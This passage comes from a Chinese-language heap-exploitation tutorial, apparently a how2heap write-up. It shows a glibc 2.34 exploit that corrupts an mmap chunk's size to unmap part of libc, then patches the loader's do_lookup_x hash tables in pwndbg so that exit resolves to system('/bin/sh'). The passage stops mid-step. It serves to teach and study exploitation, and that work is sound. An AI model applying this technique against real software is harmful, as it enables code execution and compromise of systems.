class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	clearenv();</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="keyword">int</span> libc_to_overwrite = <span class="number">0x16000</span>;</span><br><span class="line">	<span class="keyword">long</span> fake_chunk_size =  mmap_chunk_3[<span class="number">-1</span>]<span class="number">-2</span> + mmap_chunk_2[<span class="number">-1</span>]<span class="number">-2</span> + <span class="number">2</span>;</span><br><span class="line">	fake_chunk_size += libc_to_overwrite;</span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = fake_chunk_size;</span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line">	<span class="keyword">uint8_t</span>*  overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    <span class="keyword">char</span> *line = <span class="string">"/bin/sh"</span>;</span><br><span class="line">	<span class="built_in">exit</span>(*line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正常程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>两边在分别运行到<code>exit(*line);</code>和<code>exit(0);</code>这行之后，在<code>do_lookup_x</code>处下断点。<br>这里注意保存一下<code>/bi/sh</code>的地址。用处后面会说到。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_binsh.png" alt><br>然后<code>c</code>继续运行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b do_lookup_x</span><br><span class="line">Breakpoint 4 at 0x7ffff7dd6d5e: file dl-lookup.c, line 362.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 4, do_lookup_x (undef_name=undef_name@entry=0x55555555439b "exit", new_hash=new_hash@entry=2090237503, old_hash=old_hash@entry=0x7fffffffd848, ref=0x555555756090, result=result@entry=0x7fffffffd830, scope=0x7ffff7ffe4e0, i=0, version=0x7ffff7ff45a0, flags=1, skip=0x0, type_class=1, undef_map=0x7ffff7ffe220) at dl-lookup.c:362</span><br></pre></td></tr></table></figure>
<p>两边都进入了dl-lookup.c文件。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_lookup.png" alt><br>需要的主函数体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">do_lookup_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, <span class="keyword">uint_fast32_t</span> new_hash,</span><br><span class="line">	     <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *old_hash, <span class="keyword">const</span> ElfW(Sym) *ref,</span><br><span class="line">	     struct sym_val *result, struct r_scope_elem *scope, <span class="keyword">size_t</span> i,</span><br><span class="line">	     <span class="keyword">const</span> struct r_found_version *<span class="keyword">const</span> version, <span class="keyword">int</span> flags,</span><br><span class="line">	     struct link_map *skip, <span class="keyword">int</span> type_class, struct link_map *undef_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> n = scope-&gt;r_nlist;</span><br><span class="line">  <span class="comment">/* Make sure we read the value before proceeding.  Otherwise we</span></span><br><span class="line"><span class="comment">     might use r_list pointing to the initial scope and r_nlist being</span></span><br><span class="line"><span class="comment">     the value after a resize.  That is the only path in dl-open.c not</span></span><br><span class="line"><span class="comment">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span></span><br><span class="line">  __<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">""</span> : <span class="string">"+r"</span> (n), <span class="string">"+m"</span> (scope-&gt;r_list))</span></span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">list</span> = <span class="title">scope</span>-&gt;<span class="title">r_list</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> = <span class="title">list</span>[<span class="title">i</span>]-&gt;<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip'.  */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">map</span> == skip)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don't search the executable when resolving a copy reloc.  */</span></span><br><span class="line">      <span class="keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Do not look into objects which are going to be removed.  */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_removed)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Print some debugging info if wanted.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))</span><br><span class="line">	_dl_debug_printf (<span class="string">"symbol=%s;  lookup in file=%s [%lu]\n"</span>,</span><br><span class="line">			  undef_name, DSO_FILENAME (<span class="built_in">map</span>-&gt;l_name),</span><br><span class="line">			  <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the hash table is empty there is nothing to do here.  */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_nbuckets == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      Elf_Symndx symidx;</span><br><span class="line">      <span class="keyword">int</span> num_versions = <span class="number">0</span>;</span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *versioned_sym </span>= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The tables for this map.  */</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *symtab </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_SYMTAB]);</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *bitmask </span>= <span class="built_in">map</span>-&gt;l_gnu_bitmask;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely (bitmask != <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">	  ElfW(Addr) bitmask_word</span><br><span class="line">	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)</span><br><span class="line">		      &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits];</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift)</span><br><span class="line">				   &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1)</span><br><span class="line">				&amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash</span><br><span class="line">						     % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br><span class="line">	      <span class="keyword">if</span> (bucket != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">do</span></span><br><span class="line">		    <span class="keyword">if</span> (((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">		      &#123;</span><br><span class="line">			symidx = ELF_MACHINE_HASH_SYMIDX (<span class="built_in">map</span>, hasharr);</span><br><span class="line">			sym = check_match (undef_name, ref, version, flags,</span><br><span class="line">					   type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">					   strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">					   &amp;num_versions);</span><br><span class="line">			<span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">			  <span class="keyword">goto</span> found_it;</span><br><span class="line">		      &#125;</span><br><span class="line">		  <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="comment">/* No symbol found.  */</span></span><br><span class="line">	  symidx = SHN_UNDEF;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (*old_hash == <span class="number">0xffffffff</span>)</span><br><span class="line">	    *old_hash = _dl_elf_hash (undef_name);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Use the old SysV-style hash table.  Search the appropriate</span></span><br><span class="line"><span class="comment">	     hash bucket in this object's symbol table for a definition</span></span><br><span class="line"><span class="comment">	     for the same symbol name.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (symidx = <span class="built_in">map</span>-&gt;l_buckets[*old_hash % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br><span class="line">	       symidx != STN_UNDEF;</span><br><span class="line">	       symidx = <span class="built_in">map</span>-&gt;l_chain[symidx])</span><br><span class="line">	    &#123;</span><br><span class="line">	      sym = check_match (undef_name, ref, version, flags,</span><br><span class="line">				 type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">				 strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">				 &amp;num_versions);</span><br><span class="line">	      <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> found_it;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we have seen exactly one versioned symbol while we are</span></span><br><span class="line"><span class="comment">	 looking for an unversioned symbol and the version is not the</span></span><br><span class="line"><span class="comment">	 default version we still accept this symbol since there are</span></span><br><span class="line"><span class="comment">	 no possible ambiguities.  */</span></span><br><span class="line">      sym = num_versions == <span class="number">1</span> ? versioned_sym : <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	found_it:</span><br><span class="line">	  <span class="comment">/* When UNDEF_MAP is NULL, which indicates we are called from</span></span><br><span class="line"><span class="comment">	     do_lookup_x on relocation against protected data, we skip</span></span><br><span class="line"><span class="comment">	     the data definion in the executable from copy reloc.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA</span><br><span class="line">	      &amp;&amp; undef_map == <span class="literal">NULL</span></span><br><span class="line">	      &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable</span><br><span class="line">	      &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *s</span>;</span><br><span class="line">	      <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ! ELF_MACHINE_NO_RELA</span></span><br><span class="line">	      <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_info[DT_RELA] != <span class="literal">NULL</span></span><br><span class="line">		  &amp;&amp; <span class="built_in">map</span>-&gt;l_info[DT_RELASZ] != <span class="literal">NULL</span></span><br><span class="line">		  &amp;&amp; <span class="built_in">map</span>-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Rela)</span> *rela</span></span><br><span class="line"><span class="function">		    </span>= (<span class="keyword">const</span> ElfW(Rela) *) D_PTR (<span class="built_in">map</span>, l_info[DT_RELA]);</span><br><span class="line">		  <span class="keyword">unsigned</span> <span class="keyword">int</span> rela_count</span><br><span class="line">		    = <span class="built_in">map</span>-&gt;l_info[DT_RELASZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (*rela);</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rela_count; i++, rela++)</span><br><span class="line">		    <span class="keyword">if</span> (elf_machine_type_class (ELFW(R_TYPE) (rela-&gt;r_info))</span><br><span class="line">			== ELF_RTYPE_CLASS_COPY)</span><br><span class="line">		      &#123;</span><br><span class="line">			s = &amp;symtab[ELFW(R_SYM) (rela-&gt;r_info)];</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span> (strtab + s-&gt;st_name, undef_name))</span><br><span class="line">			  <span class="keyword">goto</span> skip;</span><br><span class="line">		      &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ! ELF_MACHINE_NO_REL</span></span><br><span class="line">	      <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_info[DT_REL] != <span class="literal">NULL</span></span><br><span class="line">		  &amp;&amp; <span class="built_in">map</span>-&gt;l_info[DT_RELSZ] != <span class="literal">NULL</span></span><br><span class="line">		  &amp;&amp; <span class="built_in">map</span>-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Rel)</span> *rel</span></span><br><span class="line"><span class="function">		    </span>= (<span class="keyword">const</span> ElfW(Rel) *) D_PTR (<span class="built_in">map</span>, l_info[DT_REL]);</span><br><span class="line">		  <span class="keyword">unsigned</span> <span class="keyword">int</span> rel_count</span><br><span class="line">		    = <span class="built_in">map</span>-&gt;l_info[DT_RELSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (*rel);</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rel_count; i++, rel++)</span><br><span class="line">		    <span class="keyword">if</span> (elf_machine_type_class (ELFW(R_TYPE) (rel-&gt;r_info))</span><br><span class="line">			== ELF_RTYPE_CLASS_COPY)</span><br><span class="line">		      &#123;</span><br><span class="line">			s = &amp;symtab[ELFW(R_SYM) (rel-&gt;r_info)];</span><br><span class="line">			<span class="keyword">if</span> (!<span class="built_in">strcmp</span> (strtab + s-&gt;st_name, undef_name))</span><br><span class="line">			  <span class="keyword">goto</span> skip;</span><br><span class="line">		      &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Hidden and internal symbols are local, ignore them.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (dl_symbol_visibility_binds_local_p (sym)))</span><br><span class="line">	    <span class="keyword">goto</span> skip;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">switch</span> (ELFW(ST_BIND) (sym-&gt;st_info))</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">case</span> STB_WEAK:</span><br><span class="line">	      <span class="comment">/* Weak definition.  Use this value if we don't find another.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_dynamic_weak)))</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (! result-&gt;s)</span><br><span class="line">		    &#123;</span><br><span class="line">		      result-&gt;s = sym;</span><br><span class="line">		      result-&gt;m = (struct link_map *) <span class="built_in">map</span>;</span><br><span class="line">		    &#125;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="comment">/* FALLTHROUGH */</span></span><br><span class="line">	    <span class="keyword">case</span> STB_GLOBAL:</span><br><span class="line">	      <span class="comment">/* Global definition.  Just what we need.  */</span></span><br><span class="line">	      result-&gt;s = sym;</span><br><span class="line">	      result-&gt;m = (struct link_map *) <span class="built_in">map</span>;</span><br><span class="line">	      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> STB_GNU_UNIQUE:;</span><br><span class="line">	      do_lookup_unique (undef_name, new_hash, (struct link_map *) <span class="built_in">map</span>,</span><br><span class="line">				result, type_class, sym, strtab, ref,</span><br><span class="line">				undef_map, flags);</span><br><span class="line">	      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">default</span>:</span><br><span class="line">	      <span class="comment">/* Local symbols are ignored.  */</span></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">skip:</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (++i &lt; n);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have not found anything until now.  */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序会先经过一遍do_lookup_x函数，然后运行到<code>sym = num_versions == 1 ? versioned_sym : NULL;</code>后跳转到<code>while (++i &lt; n);</code>回到开头。然后当程序第二次运行到计算 bitmask 的时候，开始修补程序。<br>首先是 bitmask_word：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmask.png" alt><br>这两个值是相同的，且不为0，可以进入下一步计算 bitmask_word；<br>由于受到攻击的程序内存映射被取消，所以它的 bitmask_word 值为0；<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmaskword.png" alt><br>我们通过正常的程序把它修补为正确的值：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmaskword2.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p/x bitmask_word</span><br><span class="line"><span class="meta">$</span>8 = 0x0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set bitmask_word=0xf000028c2200930e</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set bitmask[(new_hash / __ELF_NATIVE_CLASS)&amp; map-&gt;l_gnu_bitmask_idxbits]=0xf000028c2200930e</span><br></pre></td></tr></table></figure></p>
<p>继续修补 buckets。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_bucket.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> set bucket=0xac1</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set map-&gt;l_gnu_buckets[new_hash% map-&gt;l_nbuckets]=0xac1</span><br></pre></td></tr></table></figure></p>
<p>继续修补 hasharr。这里和上面稍微有些不一样，hasharr的长度是我们要修补的值得一半。所以要这样：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_hasharr.png" alt><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/gx hasharr</span><br><span class="line">0x7ffff79e5588:	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set *hasharr=0x8909dca07c967e3e</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/gx hasharr</span><br><span class="line">0x7ffff79e5588:	0x000000007c967e3e</span><br><span class="line"><span class="meta">pwndbg&gt;</span> set *(hasharr+1)=0x111111118909dca0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/gx hasharr</span><br><span class="line">0x7ffff79e5588:	0x8909dca07c967e3e</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br></pre></td></tr></table></figure></p>
<p>然后劫持sym符号表的<code>st_value</code><br>一个sym符号表的结构为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        Elf64_Word      st_name;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_info;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;</span><br><span class="line">        Elf64_Half      st_shndx;</span><br><span class="line">        Elf64_Addr      st_value;</span><br><span class="line">        Elf64_Xword     st_size;</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></p>
<p>其中<code>st_value</code>记录了目标符号在libc中的偏移。<br>关于偏移我们可以使用readelf也可以使用pwntools中的symbols来寻找。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">"/home/pukrquq/Downloads/glibc-2.34/64/lib/libc.so.6"</span>)</span><br><span class="line">print(hex(libc.symbols[<span class="string">'exit'</span>]))</span><br><span class="line">print(hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment"># 0x3d342</span></span><br><span class="line"><span class="comment"># 0x46e98</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_sym1.png" alt><br>程序运行到上面的部分的时候查看：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/rew_sym2.png" alt><br>然后在被破坏程序中修补：</p>
